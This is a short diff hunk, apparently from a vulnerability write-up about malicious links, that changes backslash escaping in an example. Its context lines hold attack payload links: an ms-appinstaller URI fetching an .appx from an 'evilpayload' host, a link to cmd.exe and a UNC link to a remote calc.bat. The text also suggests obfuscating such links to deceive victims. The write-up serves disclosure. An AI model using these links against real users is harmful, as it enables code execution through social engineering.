@@ -9,7 +9,7 @@ Link: ms-appinstaller://?source=`https://www.evilpayload.com.br/xxx.appx`
 
 Link: c:/windows/system32/cmd.exe
 
-Link: file:///\\10.0.0.20\usuario_mal\calc.bat
+Link: file:///\\\\10.0.0.20\usuario_mal\calc.bat
 
 It is possible to create obfuscated links to improve the social engineering against the victim.
 
